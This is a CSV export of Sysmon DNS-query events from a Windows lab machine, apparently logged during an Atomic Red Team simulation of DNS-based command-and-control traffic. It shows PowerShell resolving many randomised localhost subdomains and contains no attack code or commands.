"2025-12-22 13:58:18.837 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165630,"Query: atomicredteam-829441.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:18.349","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:18.837 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165631,"Query: atomicredteam-398971.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:18.392","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:19.843 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165632,"Query: atomicredteam-764626.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:18.435","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:19.844 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165633,"Query: atomicredteam-526162.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:18.479","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:19.844 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165634,"Query: atomicredteam-899484.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:18.523","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:19.844 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165635,"Query: atomicredteam-389327.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:18.843","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:19.844 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165636,"Query: atomicredteam-267175.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:18.887","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:19.844 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165637,"Query: atomicredteam-655446.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:18.932","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:19.844 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165638,"Query: atomicredteam-737129.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:18.974","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:19.844 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165639,"Query: atomicredteam-152340.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:19.014","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:20.851 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165640,"Query: atomicredteam-911894.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:19.332","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:20.851 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165641,"Query: atomicredteam-353168.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:19.513","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:20.852 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165642,"Query: atomicredteam-25643.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:19.556","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:20.852 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165643,"Query: atomicredteam-392354.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:19.877","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:20.853 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165644,"Query: atomicredteam-691339.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:19.921","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:20.853 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165645,"Query: atomicredteam-656629.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:19.970","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:20.853 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165646,"Query: atomicredteam-122345.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:20.012","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:20.853 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165647,"Query: atomicredteam-228466.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:20.057","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:20.853 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165648,"Query: atomicredteam-874509.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:20.239","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:20.853 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165649,"Query: atomicredteam-786632.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:20.282","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:20.853 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165650,"Query: atomicredteam-526105.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:20.463","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:20.853 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165651,"Query: atomicredteam-692873.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:20.507","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:20.853 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165652,"Query: atomicredteam-898589.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:20.550","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:20.854 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165653,"Query: atomicredteam-659447.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:20.595","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:20.854 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165654,"Query: atomicredteam-35566.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:20.638","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:20.854 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165655,"Query: atomicredteam-381852.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:20.680","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:20.854 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165656,"Query: atomicredteam-128441.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:20.726","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:21.867 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165657,"Query: atomicredteam-742605.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:20.769","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:21.867 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165658,"Query: atomicredteam-358563.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:20.810","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:21.867 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165659,"Query: atomicredteam-427454.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:20.853","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:21.867 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165660,"Query: atomicredteam-91723.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:20.896","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:21.867 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165661,"Query: atomicredteam-152262.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:20.939","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:21.867 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165662,"Query: atomicredteam-475656.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:20.983","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:21.867 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165663,"Query: atomicredteam-837788.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:21.163","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:21.867 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165664,"Query: atomicredteam-726184.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:21.206","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:21.867 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165665,"Query: atomicredteam-588937.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:21.248","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:21.867 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165666,"Query: atomicredteam-86403.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:21.292","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:21.867 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165667,"Query: atomicredteam-875748.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:21.340","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:21.867 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165668,"Query: atomicredteam-812568.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:21.385","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:21.867 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165669,"Query: atomicredteam-781083.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:21.426","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:21.867 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165670,"Query: atomicredteam-124121.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:21.467","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:21.867 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165671,"Query: atomicredteam-526442.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:21.508","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:21.868 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165672,"Query: atomicredteam-734041.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:21.550","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:21.868 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165673,"Query: atomicredteam-111103.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:21.594","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:21.868 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165674,"Query: atomicredteam-183262.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:21.636","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:22.882 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165675,"Query: atomicredteam-831307.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:21.680","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:22.882 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165676,"Query: atomicredteam-929423.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:21.725","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:22.883 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165677,"Query: atomicredteam-345999.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:22.045","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:22.883 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165678,"Query: atomicredteam-64551.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:22.089","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
